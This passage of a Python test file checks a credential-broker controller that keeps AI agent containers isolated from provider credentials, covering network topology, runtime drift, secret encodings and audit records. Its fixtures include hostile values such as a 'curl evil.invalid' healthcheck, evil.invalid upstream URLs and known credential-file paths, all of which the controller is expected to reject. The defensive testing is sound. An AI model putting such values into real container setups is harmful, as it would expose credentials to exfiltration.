def test_controller_rootfs_scan_rejects_known_paths_and_hashes_benign_image(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Image evidence binds benign bytes and rejects credential files independent of content."""
    session = _controller_session(monkeypatch)
    benign = tmp_path / "benign.tar"
    _write_tar(benign, (("opt/application/readme.txt", b"synthetic benign file\n"),))
    observed = session._scan_rootfs_archive(benign)
    assert len(observed) == 64

    credential_file = tmp_path / "credential-file.tar"
    _write_tar(credential_file, (("root/.codex/auth.json", b"{}\n"),))
    with pytest.raises(broker_controller.CredentialBrokerError, match="credential-file path"):
        session._scan_rootfs_archive(credential_file)

    claude_file = tmp_path / "claude-credential-file.tar"
    _write_tar(claude_file, (("tmp/.claude.json", b"synthetic non-secret state\n"),))
    with pytest.raises(broker_controller.CredentialBrokerError, match="credential-file path"):
        session._scan_rootfs_archive(claude_file)


def test_controller_rejects_any_file_under_the_agent_config_home(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Renaming an auth file cannot hide it inside an image-defined agent config home."""
    session = _controller_session(monkeypatch)
    session._image_environment = {"CODEX_HOME": "/opt/synthetic-codex-home"}
    archive = tmp_path / "config-home.tar"
    _write_tar(
        archive,
        (("opt/synthetic-codex-home/innocent-name.txt", b"synthetic state\n"),),
    )
    with pytest.raises(broker_controller.CredentialBrokerError, match="credential-file path"):
        session._scan_rootfs_archive(archive)


def test_controller_detects_encoded_secret_across_stream_chunk_boundary(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Streaming image and workdir scans retain enough overlap for the longest encoding."""
    session = _controller_session(monkeypatch)
    encoded = _encoded_secret("upper-hex", RAW_CREDENTIAL.encode("utf-8"))
    split_prefix = b"x" * (1024 * 1024 - len(encoded) // 2)

    archive = tmp_path / "boundary.tar"
    _write_tar(
        archive,
        (("opt/application/data.bin", split_prefix + encoded + b"-suffix"),),
    )
    with pytest.raises(broker_controller.CredentialBrokerError, match="credential"):
        session._scan_rootfs_archive(archive)

    workdir = tmp_path / "work-boundary"
    workdir.mkdir()
    (workdir / "artifact.bin").write_bytes(split_prefix + encoded + b"-suffix")
    session._configuration_bytes = b'{"format_version":"1"}\n'
    with pytest.raises(broker_controller.CredentialBrokerError, match="credential"):
        session._reject_raw_credential_artifacts(
            "synthetic transcript",
            workdir,
            b'{"decision":"allowed"}\n',
        )


@pytest.mark.parametrize(
    "location",
    ("transcript", "workdir", "audit", "configuration"),
)
@pytest.mark.parametrize(
    "encoding",
    (
        "raw",
        "hex",
        "base64",
        "urlsafe-base64",
        "percent",
        "path-percent",
    ),
)
def test_controller_rejects_encoded_secret_in_agent_evidence(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    location: str,
    encoding: str,
) -> None:
    """No reversible secret representation may survive in any agent evidence surface."""
    session = _controller_session(monkeypatch)
    workdir = tmp_path / "work"
    workdir.mkdir()
    transcript = "synthetic transcript"
    audit = b'{"decision":"allowed"}\n'
    configuration = b'{"format_version":"1"}\n'
    encoded = _encoded_secret(encoding, RAW_CREDENTIAL.encode("utf-8"))
    if location == "transcript":
        transcript = encoded.decode("ascii")
    elif location == "workdir":
        (workdir / "artifact.bin").write_bytes(encoded)
    elif location == "audit":
        audit = encoded
    elif location == "configuration":
        configuration = encoded
    session._configuration_bytes = configuration
    with pytest.raises(broker_controller.CredentialBrokerError, match="credential"):
        session._reject_raw_credential_artifacts(transcript, workdir, audit)


def _internal_network_record(
    session: broker_controller.CredentialBrokerSession,
    *,
    containers: Mapping[str, object] | None = None,
) -> dict[str, object]:
    """Return exact synthetic Docker inspect evidence for the sealed network."""
    return {
        "Attachable": False,
        "Containers": dict(containers or {}),
        "Driver": "bridge",
        "Id": "a" * 64,
        "EnableIPv4": True,
        "EnableIPv6": False,
        "Ingress": False,
        "Internal": True,
        "Labels": {"stinger.credential-isolation": "protocol-2"},
        "Name": session.network_name,
        "IPAM": {
            "Config": [{"Subnet": "172.30.0.0/16"}],
            "Driver": "default",
            "Options": {},
        },
        "Options": {
            "com.docker.network.bridge.gateway_mode_ipv4": "isolated",
            "com.docker.network.enable_ipv4": "true",
        },
    }


def _outbound_network_record(
    session: broker_controller.CredentialBrokerSession,
    *,
    containers: Mapping[str, object] | None = None,
) -> dict[str, object]:
    """Return exact synthetic Docker evidence for the broker-only NAT bridge."""
    return {
        "Attachable": False,
        "Containers": dict(containers or {}),
        "Driver": "bridge",
        "Id": "d" * 64,
        "EnableIPv4": True,
        "EnableIPv6": False,
        "Ingress": False,
        "Internal": False,
        "Labels": {"stinger.credential-isolation": "protocol-2"},
        "Name": session.outbound_network_name,
        "IPAM": {
            "Config": [{"Gateway": "172.31.0.1", "Subnet": "172.31.0.0/16"}],
            "Driver": "default",
            "Options": {},
        },
        "Options": {
            "com.docker.network.bridge.gateway_mode_ipv4": "nat",
            "com.docker.network.enable_ipv4": "true",
        },
    }


def test_controller_creates_exact_isolated_network(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Network creation pins isolated gateway mode, IPv4 only, and no initial members."""
    session = _controller_session(monkeypatch)
    captured: dict[str, object] = {}

    def run_docker(
        arguments: Sequence[str],
        **kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        captured["arguments"] = tuple(arguments)
        captured.update(kwargs)
        return subprocess.CompletedProcess(
            args=["docker"],
            returncode=0,
            stdout="a" * 64 + "\n",
            stderr="",
        )

    monkeypatch.setattr(broker_controller, "run_docker", run_docker)
    monkeypatch.setattr(session, "_inspect_network", lambda: _internal_network_record(session))
    session._create_internal_network()

    assert captured["arguments"] == (
        "network",
        "create",
        "--driver",
        "bridge",
        "--internal",
        "--ipv6=false",
        "--opt",
        "com.docker.network.bridge.gateway_mode_ipv4=isolated",
        "--opt",
        "com.docker.network.enable_ipv4=true",
        "--label",
        "stinger.credential-isolation=protocol-2",
        session.network_name,
    )
    assert captured["runtime"] == session._runtime
    assert captured["observe_if_missing"] is False
    assert session._network_id == "a" * 64


def test_controller_creates_exact_dedicated_outbound_network(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The broker receives a fresh user-defined NAT bridge, never shared default bridge."""
    session = _controller_session(monkeypatch)
    captured: dict[str, object] = {}

    def run_docker(
        arguments: Sequence[str],
        **kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        captured["arguments"] = tuple(arguments)
        captured.update(kwargs)
        return subprocess.CompletedProcess(
            args=["docker"],
            returncode=0,
            stdout="d" * 64 + "\n",
            stderr="",
        )

    monkeypatch.setattr(broker_controller, "run_docker", run_docker)
    monkeypatch.setattr(
        session,
        "_inspect_outbound_network",
        lambda: _outbound_network_record(session),
    )
    session._create_outbound_network()

    assert captured["arguments"] == (
        "network",
        "create",
        "--driver",
        "bridge",
        "--ipv6=false",
        "--opt",
        "com.docker.network.bridge.gateway_mode_ipv4=nat",
        "--opt",
        "com.docker.network.enable_ipv4=true",
        "--label",
        "stinger.credential-isolation=protocol-2",
        session.outbound_network_name,
    )
    assert captured["runtime"] == session._runtime
    assert captured["observe_if_missing"] is False
    assert session._outbound_network_id == "d" * 64


@pytest.mark.parametrize(
    "drift",
    (
        "attachable",
        "container",
        "gateway",
        "gateway-mode",
        "ingress",
        "ipv4-disabled",
        "ipv6-enabled",
        "not-internal",
    ),
)
def test_controller_rejects_fresh_network_identity_drift(
    monkeypatch: pytest.MonkeyPatch,
    drift: str,
) -> None:
    """Any route, member, or network identity ambiguity aborts before agent launch."""
    session = _controller_session(monkeypatch)
    record = _internal_network_record(session)
    if drift == "attachable":
        record["Attachable"] = True
    elif drift == "container":
        record["Containers"] = {"c" * 64: {"Name": "unexpected"}}
    elif drift == "gateway":
        ipam = record["IPAM"]
        assert isinstance(ipam, dict)
        configurations = ipam["Config"]
        assert isinstance(configurations, list)
        configuration = configurations[0]
        assert isinstance(configuration, dict)
        configuration["Gateway"] = "172.30.0.1"
    elif drift == "gateway-mode":
        options = record["Options"]
        assert isinstance(options, dict)
        options["com.docker.network.bridge.gateway_mode_ipv4"] = "nat"
    elif drift == "ingress":
        record["Ingress"] = True
    elif drift == "ipv4-disabled":
        record["EnableIPv4"] = False
    elif drift == "ipv6-enabled":
        record["EnableIPv6"] = True
    else:
        assert drift == "not-internal"
        record["Internal"] = False
    monkeypatch.setattr(
        broker_controller,
        "run_docker",
        lambda *args, **kwargs: subprocess.CompletedProcess(
            args=["docker"],
            returncode=0,
            stdout="a" * 64 + "\n",
            stderr="",
        ),
    )
    monkeypatch.setattr(session, "_inspect_network", lambda: record)

    with pytest.raises(broker_controller.CredentialBrokerError, match="closed topology"):
        session._create_internal_network()


def test_controller_requires_exact_post_run_broker_network_membership(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """After agent exit, only the live broker may remain in network membership."""
    session = _controller_session(monkeypatch)
    session._network_id = "a" * 64
    session._broker_container_id = "b" * 64
    exact = _internal_network_record(
        session,
        containers={"2" * 64: {"Name": session.broker_container_name}},
    )
    monkeypatch.setattr(session, "_inspect_network", lambda: exact)
    session._verify_internal_network_membership()

    for names in (
        (),
        ("synthetic-agent",),
        ("synthetic-agent", session.broker_container_name, "evil-sidecar"),
        ("synthetic-agent", session.broker_container_name),
    ):
        drifted = copy.deepcopy(exact)
        drifted["Containers"] = {
            str(index) * 64: {"Name": name} for index, name in enumerate(names, start=3)
        }
        monkeypatch.setattr(session, "_inspect_network", lambda value=drifted: value)
        with pytest.raises(broker_controller.CredentialBrokerError, match="membership"):
            session._verify_internal_network_membership()


def test_controller_requires_exact_outbound_network_membership(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """No unrelated container may share the broker's invocation-private NAT bridge."""
    session = _controller_session(monkeypatch)
    session._outbound_network_id = "d" * 64
    exact = _outbound_network_record(
        session,
        containers={"2" * 64: {"Name": session.broker_container_name}},
    )
    monkeypatch.setattr(session, "_inspect_outbound_network", lambda: exact)
    session._verify_outbound_network_membership()

    for names in ((), ("unrelated",), (session.broker_container_name, "unrelated")):
        drifted = copy.deepcopy(exact)
        drifted["Containers"] = {
            str(index) * 64: {"Name": name} for index, name in enumerate(names, start=3)
        }
        monkeypatch.setattr(session, "_inspect_outbound_network", lambda value=drifted: value)
        with pytest.raises(broker_controller.CredentialBrokerError, match="membership"):
            session._verify_outbound_network_membership()


@pytest.mark.parametrize("internal_attempted", (False, True))
def test_controller_cleanup_proves_all_attempted_networks_absent(
    monkeypatch: pytest.MonkeyPatch,
    internal_attempted: bool,
) -> None:
    """Partial and complete startup paths remove every network they attempted to create."""
    session = _controller_session(monkeypatch)
    session._network_creation_attempted = internal_attempted
    session._outbound_network_creation_attempted = True
    calls: list[tuple[str, ...]] = []

    def run_docker(
        arguments: Sequence[str],
        **kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        del kwargs
        calls.append(tuple(arguments))
        return subprocess.CompletedProcess(
            args=["docker"],
            returncode=0,
            stdout="",
            stderr="",
        )

    monkeypatch.setattr(broker_controller, "run_docker", run_docker)
    session._remove_networks()

    removed = [arguments[2] for arguments in calls if arguments[:2] == ("network", "rm")]
    expected = [session.outbound_network_name]
    if internal_attempted:
        expected.insert(0, session.network_name)
    assert removed == expected
    assert sum(arguments[:2] == ("network", "ls") for arguments in calls) == 2


def _agent_runtime_record(
    session: broker_controller.CredentialBrokerSession,
    workdir: Path,
    *,
    expected_command: tuple[str, ...],
) -> dict[str, object]:
    """Return exact stopped-agent Docker evidence for controller validation."""
    agent_image = "sha256:" + "9" * 64
    expected_user = f"{os.getuid()}:{os.getgid()}" if hasattr(os, "getuid") else ""
    return {
        "Config": {
            "Cmd": list(expected_command),
            "Entrypoint": None,
            "Env": [
                "PYTHONDONTWRITEBYTECODE=1",
                "PYTHONHASHSEED=0",
                "HOME=/tmp",
                *(f"{name}={value}" for name, value in session.agent_environment().items()),
            ],
            "Healthcheck": {"Test": ["NONE"]},
            "Image": agent_image,
            "User": expected_user,
            "WorkingDir": "/work",
        },
        "HostConfig": {
            "AutoRemove": False,
            "CapAdd": None,
            "CapDrop": ["ALL"],
            "Dns": ["127.0.0.1"],
            "DnsOptions": ["timeout:1", "attempts:1"],
            "DnsSearch": ["."],
            "NetworkMode": session.network_name,
            "PidMode": "",
            "PortBindings": {},
            "Privileged": False,
            "PublishAllPorts": False,
            "SecurityOpt": ["no-new-privileges:true"],
            "Sysctls": {
                "net.ipv4.conf.all.forwarding": "0",
                "net.ipv6.conf.all.forwarding": "0",
            },
            "UsernsMode": "",
        },
        "Id": "c" * 64,
        "Image": agent_image,
        "Mounts": [
            {
                "Destination": "/work",
                "RW": True,
                "Source": str(workdir.resolve()),
                "Type": "bind",
            }
        ],
        "NetworkSettings": {
            "Networks": {
                session.network_name: {
                    "Gateway": "",
                    "GlobalIPv6Address": "",
                    "IPv6Gateway": "",
                }
            }
        },
        "State": {
            "ExitCode": 0,
            "Health": None,
            "Running": False,
        },
    }


@pytest.mark.parametrize(
    "drift",
    (
        "auto-remove",
        "cap-add",
        "dns-upstream",
        "dns-search",
        "dns-options",
        "extra-host",
        "gateway",
        "healthcheck",
        "health-state",
        "link",
        "pid-mode",
        "port-binding",
        "publish-port",
        "second-network",
        "security-option",
        "user",
        "userns-mode",
        "working-directory",
    ),
)
def test_controller_rejects_agent_network_and_healthcheck_drift(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    drift: str,
) -> None:
    """A gateway, external DNS route, healthcheck, or second network fails closed."""
    session = _controller_session(monkeypatch)
    session._started = True
    session._agent_image_metadata_scanned = True
    session._network_id = "a" * 64
    session._outbound_network_id = "d" * 64
    expected_command = ("python", "/work/agent.py")
    workdir = tmp_path / "work"
    workdir.mkdir()
    record = _agent_runtime_record(session, workdir, expected_command=expected_command)
    config = record["Config"]
    host = record["HostConfig"]
    state = record["State"]
    network_settings = record["NetworkSettings"]
    assert isinstance(config, dict)
    assert isinstance(host, dict)
    assert isinstance(state, dict)
    assert isinstance(network_settings, dict)
    networks = network_settings["Networks"]
    assert isinstance(networks, dict)
    attachment = networks[session.network_name]
    assert isinstance(attachment, dict)
    if drift == "auto-remove":
        host["AutoRemove"] = True
    elif drift == "cap-add":
        host["CapAdd"] = ["SYS_PTRACE"]
    elif drift == "dns-upstream":
        host["Dns"] = ["1.1.1.1"]
    elif drift == "dns-search":
        host["DnsSearch"] = ["corp.invalid"]
    elif drift == "dns-options":
        host["DnsOptions"] = ["attempts:5"]
    elif drift == "gateway":
        attachment["Gateway"] = "172.30.0.1"
    elif drift == "healthcheck":
        config["Healthcheck"] = {"Test": ["CMD-SHELL", "curl evil.invalid"]}
    elif drift == "health-state":
        state["Health"] = {"Status": "healthy"}
    elif drift == "extra-host":
        host["ExtraHosts"] = ["host.docker.internal:host-gateway"]
    elif drift == "link":
        host["Links"] = ["evil:evil"]
    elif drift == "pid-mode":
        host["PidMode"] = "host"
    elif drift == "port-binding":
        host["PortBindings"] = {"8765/tcp": [{"HostPort": "8765"}]}
    elif drift == "publish-port":
        host["PublishAllPorts"] = True
    elif drift == "security-option":
        host["SecurityOpt"] = ["no-new-privileges:false"]
    elif drift == "user":
        config["User"] = "0:0"
    elif drift == "userns-mode":
        host["UsernsMode"] = "host"
    elif drift == "working-directory":
        config["WorkingDir"] = "/"
    else:
        assert drift == "second-network"
        networks["bridge"] = {}
    monkeypatch.setattr(session, "_inspect_container", lambda name: record)

    with pytest.raises(
        broker_controller.CredentialBrokerError,
        match="runtime identity|unapproved gateway",
    ):
        session._inspect_agent_container(
            agent_container_name="synthetic-agent",
            agent_image="sha256:" + "9" * 64,
            workdir=workdir,
            exit_code=0,
            expected_command=expected_command,
        )


def test_controller_accepts_exact_gatewayless_agent_runtime(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The sole accepted agent attachment has loopback DNS and no gateway or healthcheck."""
    session = _controller_session(monkeypatch)
    session._started = True
    session._agent_image_metadata_scanned = True
    session._network_id = "a" * 64
    session._outbound_network_id = "d" * 64
    expected_command = ("python", "/work/agent.py")
    workdir = tmp_path / "work"
    workdir.mkdir()
    record = _agent_runtime_record(session, workdir, expected_command=expected_command)
    monkeypatch.setattr(session, "_inspect_container", lambda name: record)
    expected_user = f"{os.getuid()}:{os.getgid()}" if hasattr(os, "getuid") else ""

    observed = session._inspect_agent_container(
        agent_container_name="synthetic-agent",
        agent_image="sha256:" + "9" * 64,
        workdir=workdir,
        exit_code=0,
        expected_command=expected_command,
    )

    assert observed["network_attachment_inventory"] == {
        "agent_container_id_sha256": _sha256(("c" * 64).encode("ascii")),
        "agent_networks": [session.network_name],
        "bridge_gateway_mode_ipv4": "isolated",
        "broker_alias": BROKER_ALIAS,
        "broker_networks": [
            "fresh-dedicated-provider-egress-network",
            session.network_name,
        ],
        "broker_outbound_network_id_sha256": _sha256(("d" * 64).encode("ascii")),
        "broker_outbound_network_name_sha256": _sha256(
            session.outbound_network_name.encode("ascii")
        ),
        "container_dns_upstream": "loopback-only",
        "host_gateway_present": False,
        "internal_network": True,
        "internal_network_id_sha256": _sha256(("a" * 64).encode("ascii")),
        "ipv6_enabled": False,
        "linux_capabilities": [],
        "no_new_privileges": True,
        "packet_forwarding": False,
    }
    assert observed["runtime_identity_inventory"] == {
        "auto_remove": False,
        "capabilities_added": [],
        "capabilities_dropped": ["ALL"],
        "extra_hosts": [],
        "healthcheck_disabled": True,
        "links": [],
        "no_new_privileges": True,
        "pid_mode": "private-container",
        "port_bindings": [],
        "privileged": False,
        "publish_all_ports": False,
        "runtime_user": expected_user,
        "user_namespace_mode": "daemon-default",
        "working_directory": "/work",
    }


def _valid_controller_audit_events(
    session: broker_controller.CredentialBrokerSession,
) -> list[dict[str, object]]:
    configuration_sha256 = "c" * 64
    session._configuration_bytes = b'{"synthetic":"configuration"}\n'
    configuration_bytes_sha256 = _sha256(session._configuration_bytes)
    path_sha256 = _sha256(APPROVED_AGENT_PATH.encode("utf-8"))
    common: dict[str, object] = {
        "configuration_bytes_sha256": configuration_bytes_sha256,
        "configuration_sha256": configuration_sha256,
        "method": "POST",
        "path_sha256": path_sha256,
        "request_id": 1,
        "upstream_https_origin": session._route.upstream_https_origin,
    }
    return [
        session._expected_ready_event(),
        {
            **common,
            "decision": "attempt",
            "reason": "exact route authorized before upstream",
        },
        {
            **common,
            "decision": "allowed",
            "reason": "exact route completed",
        },
        {
            "accepted_connection_count": 1,
            "allowed_destination_inventory_sha256": "d" * 64,
            "capacity_rejection_count": 0,
            "client_socket_timeout_seconds": 30,
            "connection_deadline_seconds": 600,
            "configuration_bytes_sha256": configuration_bytes_sha256,
            "configuration_sha256": configuration_sha256,
            "decision": "quiesced",
            "provider": "openai",
            "request_count": 1,
            "max_concurrent_connections": 32,
            "test_only_allow_http": False,
            "upstream_https_origin": session._route.upstream_https_origin,
            "upstream_socket_timeout_seconds": 120,
        },
    ]


@pytest.mark.parametrize(
    "field",
    (
        "agent_base_url",
        "allowed_destination_inventory_sha256",
        "client_socket_timeout_seconds",
        "connection_deadline_seconds",
        "configuration_bytes_sha256",
        "max_concurrent_connections",
        "test_only_allow_http",
        "upstream_https_origin",
        "upstream_socket_timeout_seconds",
    ),
)
def test_controller_rejects_effective_broker_identity_drift_before_agent_launch(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    field: str,
) -> None:
    """Readiness attests the bytes and effective route consumed by the broker process."""
    session = _controller_session(monkeypatch)
    session._identity_hashes = ("a" * 64, "c" * 64, "d" * 64, "e" * 64)
    session._configuration_bytes = b'{"synthetic":"configuration"}\n'
    audit_path = tmp_path / "audit.jsonl"
    session._audit_path = audit_path
    event = session._expected_ready_event()
    replacements: dict[str, object] = {
        "agent_base_url": "http://evil.invalid:8765/openai/v1",
        "allowed_destination_inventory_sha256": "f" * 64,
        "client_socket_timeout_seconds": 0,
        "connection_deadline_seconds": 0,
        "configuration_bytes_sha256": "f" * 64,
        "max_concurrent_connections": 0,
        "test_only_allow_http": True,
        "upstream_https_origin": "http://evil.invalid:80",
        "upstream_socket_timeout_seconds": 0,
    }
    event[field] = replacements[field]
    audit_path.write_bytes(canonical_json_bytes(event))

    with pytest.raises(broker_controller.CredentialBrokerError, match="readiness identity"):
        session._wait_until_ready()


def test_controller_rejects_tampered_then_restored_config_from_loaded_byte_identity(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Restoring host bytes cannot erase evidence of a different config the broker loaded."""
    session = _controller_session(monkeypatch)
    session._identity_hashes = ("a" * 64, "c" * 64, "d" * 64, "e" * 64)
    original = _production_configuration()
    original["configuration_sha256"] = "c" * 64
    original["lease_sha256"] = _sha256(session._lease.encode("utf-8"))
    original_bytes = canonical_json_bytes(original)
    session._configuration_bytes = original_bytes
    config_path = tmp_path / "config.json"
    audit_path = tmp_path / "audit.jsonl"
    session._config_path = config_path
    session._audit_path = audit_path
    config_path.write_bytes(original_bytes)

    tampered = _test_configuration("http://127.0.0.1:9", lease=session._lease)
    tampered["configuration_sha256"] = "c" * 64
    _write_configuration(config_path, tampered)
    loaded, loaded_bytes_sha256 = broker_server._load_configuration_with_identity(
        config_path,
        test_only_authorized=True,
    )
    config_path.write_bytes(original_bytes)
    audit_path.write_bytes(
        canonical_json_bytes(
            {
                "agent_base_url": loaded["agent_base_url"],
                "allowed_destination_inventory_sha256": (
                    broker_server._allowed_destination_inventory_sha256(loaded)
                ),
                "client_socket_timeout_seconds": broker_server.CLIENT_SOCKET_TIMEOUT_SECONDS,
                "connection_deadline_seconds": broker_server.CONNECTION_DEADLINE_SECONDS,
                "configuration_bytes_sha256": loaded_bytes_sha256,
                "configuration_sha256": "c" * 64,
                "decision": "ready",
                "listen": "0.0.0.0:8765",
                "max_concurrent_connections": broker_server.MAX_CONCURRENT_CONNECTIONS,
                "provider": "openai",
                "test_only_allow_http": True,
                "upstream_https_origin": "http://127.0.0.1:9",
                "upstream_socket_timeout_seconds": (broker_server.UPSTREAM_SOCKET_TIMEOUT_SECONDS),
            }
        )
    )

    with pytest.raises(broker_controller.CredentialBrokerError, match="readiness identity"):
        session._wait_until_ready()
    assert config_path.read_bytes() == original_bytes


@pytest.mark.parametrize(
    "drift",
    (
        "not-quiesced",
        "missing-terminal",
        "rejected-request",
        "missing-attempt",
        "request-id-gap",
        "wrong-path",
        "capacity-rejection",
        "accepted-count-mismatch",
        "noncanonical",
    ),
)
def test_controller_requires_closed_attempt_terminal_audit_pairs(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    drift: str,
) -> None:
    """Missing, rejected, malformed, or unpaired request evidence invalidates a receipt."""
    session = _controller_session(monkeypatch)
    session._identity_hashes = ("a" * 64, "c" * 64, "d" * 64, "e" * 64)
    session._broker_quiesced = drift != "not-quiesced"
    audit_path = tmp_path / "audit.jsonl"
    session._audit_path = audit_path
    events = _valid_controller_audit_events(session)
    if drift == "missing-terminal":
        events.pop()
    elif drift == "rejected-request":
        events[2]["decision"] = "rejected"
        events[2]["reason"] = "synthetic rejection"
    elif drift == "missing-attempt":
        events[1]["decision"] = "allowed"
        events[1]["reason"] = "exact route completed"
    elif drift == "request-id-gap":
        events[1]["request_id"] = 2
        events[2]["request_id"] = 2
    elif drift == "wrong-path":
        events[1]["path_sha256"] = "f" * 64
    elif drift == "capacity-rejection":
        events[-1]["capacity_rejection_count"] = 1
    elif drift == "accepted-count-mismatch":
        events[-1]["accepted_connection_count"] = 2
    encoded = b"".join(canonical_json_bytes(event) for event in events)
    if drift == "noncanonical":
        encoded = encoded.replace(b'"decision":"ready"', b'"decision": "ready"', 1)
    audit_path.write_bytes(encoded)
    with pytest.raises(broker_controller.CredentialBrokerError, match="audit|broker"):
        session._load_and_verify_audit()


def test_controller_accepts_only_complete_quiesced_audit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """One request requires an ordered attempt/allowed pair and terminal count."""
    session = _controller_session(monkeypatch)
    session._identity_hashes = ("a" * 64, "c" * 64, "d" * 64, "e" * 64)
    session._broker_quiesced = True
    audit_path = tmp_path / "audit.jsonl"
    session._audit_path = audit_path
    events = _valid_controller_audit_events(session)
    encoded = b"".join(canonical_json_bytes(event) for event in events)
    audit_path.write_bytes(encoded)
    assert session._load_and_verify_audit() == (encoded, (1, 0))


def test_controller_accepts_only_the_workdir_mount(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The agent cannot receive /credentials or any second host bind mount."""
    session = _controller_session(monkeypatch)
    workdir = tmp_path / "work"
    workdir.mkdir()
    exact = [
        {
            "Type": "bind",
            "Source": str(workdir.resolve()),
            "Destination": "/work",
            "RW": True,
        }
    ]
    inventory = session._validate_agent_mounts(exact, workdir)
    assert inventory["mounts"] == [
        {
            "destination": "/work",
            "read_only": False,
            "source_sha256": _sha256(str(workdir.resolve()).encode()),
            "type": "bind",
        }
    ]
    with pytest.raises(broker_controller.CredentialBrokerError, match="extra or missing mount"):
        session._validate_agent_mounts(
            [
                *exact,
                {
                    "Type": "bind",
                    "Source": str(tmp_path / "host-auth"),
                    "Destination": "/credentials",
                    "RW": False,
                },
            ],
            workdir,
        )


def test_controller_starts_broker_with_exact_secret_and_runtime_projection(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The raw credential enters only the broker's exact hardened Docker invocation."""
    session = _controller_session(monkeypatch)
    digest = "sha256:" + "9" * 64
    config_path = tmp_path / "config.json"
    audit_dir = tmp_path / "audit"
    audit_dir.mkdir()
    config_path.write_bytes(b"{}\n")
    session._config_path = config_path
    session._audit_path = audit_dir / "audit.jsonl"
    session._broker_image_id = digest
    captured: dict[str, object] = {}

    def run_docker(
        arguments: Sequence[str],
        **kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        captured["arguments"] = tuple(arguments)
        captured.update(kwargs)
        return subprocess.CompletedProcess(
            args=["docker"],
            returncode=0,
            stdout="a" * 64 + "\n",
            stderr="",
        )

    monkeypatch.setattr(broker_controller, "run_docker", run_docker)
    session._start_broker_container()

    expected = [
        "run",
        "--detach",
        "--name",
        session.broker_container_name,
        "--network",
        session.outbound_network_name,
        "--workdir",
        "/",
        "--read-only",
        "--cap-drop",
        "ALL",
        "--security-opt",
        "no-new-privileges",
        "--no-healthcheck",
        "--sysctl",
        "net.ipv4.conf.all.forwarding=0",
        "--sysctl",
        "net.ipv6.conf.all.forwarding=0",
        "--tmpfs",
        "/tmp:rw,noexec,nosuid,nodev,size=16m,mode=1777",
        "--volume",
        f"{REPOSITORY / 'src/stinger/credential_broker_server.py'}:{BROKER_SERVER_PATH}:ro",
        "--volume",
        f"{config_path}:{BROKER_CONFIG_PATH}:ro",
        "--volume",
        f"{audit_dir}:/evidence:rw",
        "--env",
        BROKER_RAW_CREDENTIAL_ENV,
        "--env",
        BROKER_LEASE_ENV,
        "--env",
        "PYTHONDONTWRITEBYTECODE=1",
        "--env",
        "PYTHONHASHSEED=0",
        "--entrypoint",
        "python",
    ]
    if hasattr(os, "getuid"):
        expected.extend(("--user", f"{os.getuid()}:{os.getgid()}"))
    expected.extend(
        (
            digest,
            "-B",
            BROKER_SERVER_PATH,
            BROKER_CONFIG_PATH,
            BROKER_AUDIT_PATH,
        )
    )
    assert captured["arguments"] == tuple(expected)
    assert captured["source_environment"] == {
        BROKER_RAW_CREDENTIAL_ENV: RAW_CREDENTIAL,
        BROKER_LEASE_ENV: session._lease,
    }
    assert captured["forwarded_names"] == (
        BROKER_RAW_CREDENTIAL_ENV,
        BROKER_LEASE_ENV,
    )
    assert captured["observe_if_missing"] is False


def _broker_runtime_record(
    session: broker_controller.CredentialBrokerSession,
    tmp_path: Path,
) -> dict[str, object]:
    """Return exact synthetic Docker inspect evidence for a running broker."""
    digest = "sha256:" + "9" * 64
    expected_user = f"{os.getuid()}:{os.getgid()}" if hasattr(os, "getuid") else ""
    config_path = tmp_path / "config.json"
    audit_path = tmp_path / "audit" / "audit.jsonl"
    audit_path.parent.mkdir()
    session._config_path = config_path
    session._audit_path = audit_path
    session._outbound_network_id = "d" * 64
    return {
        "Id": "b" * 64,
        "Image": digest,
        "Config": {
            "Cmd": ["-B", BROKER_SERVER_PATH, BROKER_CONFIG_PATH, BROKER_AUDIT_PATH],
            "Entrypoint": ["python"],
            "Env": [
                f"{BROKER_RAW_CREDENTIAL_ENV}={RAW_CREDENTIAL}",
                f"{BROKER_LEASE_ENV}={session._lease}",
                "PYTHONDONTWRITEBYTECODE=1",
                "PYTHONHASHSEED=0",
            ],
            "ExposedPorts": None,
            "Healthcheck": {"Test": ["NONE"]},
            "Image": digest,
            "User": expected_user,
            "WorkingDir": "/",
        },
        "State": {"Health": None, "Running": True},
        "HostConfig": {
            "AutoRemove": False,
            "CapAdd": None,
            "CapDrop": ["ALL"],
            "ExtraHosts": None,
            "Links": None,
            "NetworkMode": session.outbound_network_name,
            "PidMode": "",
            "PortBindings": None,
            "Privileged": False,
            "PublishAllPorts": False,
            "ReadonlyRootfs": True,
            "SecurityOpt": ["no-new-privileges:true"],
            "Sysctls": {
                "net.ipv4.conf.all.forwarding": "0",
                "net.ipv6.conf.all.forwarding": "0",
            },
            "Tmpfs": {
                "/tmp": "rw,noexec,nosuid,nodev,size=16m,mode=1777",
            },
            "UsernsMode": "",
        },
        "Mounts": [
            {
                "Destination": BROKER_SERVER_PATH,
                "RW": False,
                "Source": str(REPOSITORY / "src/stinger/credential_broker_server.py"),
                "Type": "bind",
            },
            {
                "Destination": BROKER_CONFIG_PATH,
                "RW": False,
                "Source": str(config_path),
                "Type": "bind",
            },
            {
                "Destination": "/evidence",
                "RW": True,
                "Source": str(audit_path.parent),
                "Type": "bind",
            },
        ],
        "NetworkSettings": {
            "Networks": {
                session.outbound_network_name: {
                    "Gateway": "172.31.0.1",
